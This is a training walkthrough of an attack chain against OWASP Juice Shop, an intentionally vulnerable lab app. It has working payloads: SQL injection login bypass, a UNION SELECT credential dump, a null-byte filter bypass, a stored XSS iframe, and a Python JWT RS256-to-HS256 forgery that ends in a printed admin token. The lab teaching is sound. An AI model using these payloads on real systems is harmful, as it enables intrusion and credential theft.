# Attack Chain Walkthrough
## OWASP Juice Shop — Mission 2026-03-12-002
## For Training and Reproducibility

---

## Mission Focus
This walkthrough covers post-authentication attack paths with emphasis on cryptographic weaknesses and authorization logic flaws. SQL injection and XSS primitives are included as foundational steps (they were exercised during this mission run) but the primary learning objective is **JWT Algorithm Confusion**.

## Prerequisites
- Target: `http://10.10.30.130:3000`
- Tools: `curl`, `python3`, `openssl`
- No prior account needed — open registration

---

## Step 1 — Recon: Map Open Directories and Key Artifacts

```bash
TARGET="10.10.30.130:3000"

# Check HTTP headers
curl -I "http://$TARGET/"
# Note: CORS wildcard (*), no CSP, X-Recruiting: /#/jobs

# List FTP directory (no auth)
curl "http://$TARGET/ftp/"

# List encryption keys directory (no auth) — CRITICAL
curl "http://$TARGET/encryptionkeys/"
# Files: jwt.pub (RSA public key), premium.key

# Download the RSA public key — needed for JWT forgery
curl -s "http://$TARGET/encryptionkeys/jwt.pub" > jwt.pub
cat jwt.pub
# -----BEGIN RSA PUBLIC KEY-----
# MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQR
# ...

# Check unauthenticated admin configuration endpoint
curl -s "http://$TARGET/rest/admin/application-configuration" | python3 -m json.tool | head -50
# Returns full app config without authentication
```

---

## Step 2 — Exploit 1: SQL Injection Login Bypass (EXP-01)

The login endpoint uses string concatenation for the email parameter.

```bash
# Payload: ' OR 1=1-- bypasses the WHERE clause and authenticates as the first user (admin)
ADMIN_TOKEN=$(curl -s -X POST "http://$TARGET/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['authentication']['token'])")

echo "Admin Token: $ADMIN_TOKEN"

# Decode JWT payload to see admin credentials in the token
echo "$ADMIN_TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
p = sys.stdin.read().strip()
p += '=' * (4 - len(p) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
"
# Note: password hash 0192023a7bbd73250516f069df18b500 is visible in the payload (= admin123)
```

---

## Step 3 — Exploit 2: Sensitive Data Exposure via Open FTP (EXP-02)

```bash
# Download KeePass credential database (no auth, no bypass needed)
curl -s "http://$TARGET/ftp/incident-support.kdbx" -o incident-support.kdbx
file incident-support.kdbx
# KeePass password database 2.x KDBX

# Access confidential M&A document
curl -s "http://$TARGET/ftp/acquisitions.md"

# Null byte bypass for .bak extension filter
# Direct request returns 403:
curl -v "http://$TARGET/ftp/coupons_2013.md.bak"

# Null byte bypass returns 200:
curl -s "http://$TARGET/ftp/coupons_2013.md.bak%2500.md"
# Coupon codes returned

# Explanation: %2500 = URL-encoded null byte (%00)
# Server decodes to null byte, OS truncates filename at null byte
# Extension filter sees .md suffix on the raw string before null
```

---

## Step 4 — Exploit 3: SQLi UNION SELECT Credential Dump (EXP-03)

```bash
# Test injection point — error on malformed input confirms SQLi
curl -s "http://$TARGET/rest/products/search?q='))"

# Determine column count: test with 9 columns (SQLite Products schema)
curl -s "http://$TARGET/rest/products/search?q=test'))%20UNION%20SELECT%20'1','2','3','4','5','6','7','8','9'--"
# Returns 1 synthetic row — 9 columns confirmed

# Dump all user credentials
curl -s "http://$TARGET/rest/products/search?q=test'))%20UNION%20SELECT%20'1',email,password,'4','5','6','7','8','9'%20FROM%20Users--" \
  | python3 -c "
import json, sys
d = json.load(sys.stdin)
rows = d.get('data', [])
print(f'Users dumped: {len(rows)}')
for r in rows:
    print(f'{r[\"name\"]} : {r[\"description\"]}')
"
# 22 user accounts with MD5 hashes returned in one unauthenticated request
```

---

## Step 5 — Exploit 4: Stored XSS via Product Review (EXP-04)

```bash
# Use admin token from Step 2 to inject XSS payload
curl -s -X PUT "http://$TARGET/rest/products/1/reviews" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"message":"<iframe src=\"javascript:alert(`xss`)\">","author":"attacker"}'
# Response: {"status":"success"}

# Verify payload persisted
curl -s "http://$TARGET/rest/products/1/reviews" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -c "
import json, sys
d = json.load(sys.stdin)
for r in d.get('data', []):
    print(r.get('message',''))
"
# Output includes: <iframe src="javascript:alert(`xss`)">
```

**Note:** The CORS wildcard (`Access-Control-Allow-Origin: *`) means this payload can be triggered and exfiltrate data from any origin.

---

## Step 6 — Exploit 5: JWT Algorithm Confusion RS256 → HS256 (EXP-05)

This is the primary learning objective of this mission.

**Background:** The server uses RS256 (asymmetric) to sign JWTs. The RSA public key is exposed unauthenticated. A vulnerable JWT library may accept HS256 tokens and — when asked to validate — use whatever "secret" was used to sign. By changing the algorithm to HS256 and signing with the RSA public key as the HMAC secret, the server validates the forged token successfully.

```bash
# Step 6a — Retrieve the RSA public key (already done in Step 1)
curl -s "http://$TARGET/encryptionkeys/jwt.pub" > jwt.pub

# Step 6b — Forge a JWT using Python
python3 << 'EOF'
import json
import base64
import hmac
import hashlib

# Read the RSA public key
with open('jwt.pub', 'rb') as f:
    key = f.read()

# Build header and payload
header = {"typ": "JWT", "alg": "HS256"}
payload = {
    "status": "success",
    "data": {
        "id": 1,
        "username": "",
        "email": "admin@juice-sh.op",
        "password": "0192023a7bbd73250516f069df18b500",
        "role": "admin",
        "deluxeToken": "",
        "lastLoginIp": "0.0.0.0",
        "profileImage": "assets/public/images/uploads/defaultAdmin.png",
        "totpSecret": "",
        "isActive": True,
        "createdAt": "2026-02-15 03:39:58.596 +00:00",
        "updatedAt": "2026-02-15 03:39:58.596 +00:00",
        "deletedAt": None
    },
    "iat": 9999999999
}

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header_enc = b64url_encode(json.dumps(header, separators=(',',':')))
payload_enc = b64url_encode(json.dumps(payload, separators=(',',':')))
signing_input = f"{header_enc}.{payload_enc}".encode()

sig = hmac.new(key, signing_input, hashlib.sha256).digest()
sig_enc = b64url_encode(sig)

forged_token = f"{header_enc}.{payload_enc}.{sig_enc}"
print(f"Forged Token:\n{forged_token}")
EOF

# Step 6c — Use the forged token to access admin endpoints
FORGED_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTAyLTE1IDAzOjM5OjU4LjU5NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTAyLTE1IDAzOjM5OjU4LjU5NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjk5OTk5OTk5OTl9.Ail9voBEwnx3njKPVVvUyQX7YAdw3Rar72qiDMZAgt4"

# Verify: access admin-only /api/Users endpoint
curl -s "http://$TARGET/api/Users" \
  -H "Authorization: Bearer $FORGED_TOKEN" | python3 -c "
import json, sys
d = json.load(sys.stdin)
users = d.get('data', [])
print(f'Users accessible with forged token: {len(users)}')
for u in users[:5]:
    print(f'  id={u[\"id\"]} email={u[\"email\"]} role={u[\"role\"]}')
"
# Expected: 22 users returned — full admin access confirmed
```

---

## Key Takeaways

| Concept | Technique | Outcome |
|---------|-----------|---------|
| JWT Algorithm Confusion | RS256→HS256 with exposed public key | Admin token forged without credentials |
| SQLi Login Bypass | OR tautology in email parameter | Admin session via unauthenticated POST |
| Open Directory Exploitation | /ftp/ unauthenticated listing | KeePass DB + confidential docs exfiltrated |
| Null Byte Bypass | %2500 extension filter evasion | .bak files accessed despite filter |
| Stored XSS | Unsanitized review API | Payload persisted; CORS wildcard amplifies |
| Unauthenticated Admin Endpoint | /rest/admin/application-configuration | Full config including OAuth secrets leaked |

---

## Why JWT Algorithm Confusion Works

The root cause is a design flaw in how many JWT libraries handle algorithm selection:

1. The JWT header (`alg`) is attacker-controlled — it is NOT protected before verification
2. Libraries that support multiple algorithms will use the `alg` field to decide how to verify
3. When the server has both RS256 (public/private key pair) and HS256 (shared secret) support:
   - RS256 verification: `verify(token, publicKey)`
   - HS256 verification: `verify(token, secret)`
4. If the server's HS256 "secret" ends up being the same bytes as the RS256 public key, a forged HS256 token signed with those bytes passes verification

**Fix:** Pin the algorithm in the JWT middleware — never trust the `alg` field from the token.

---

*Walkthrough generated: 2026-03-13 (audit reconstruction)*
*Lab environment — OWASP Juice Shop is intentionally vulnerable*
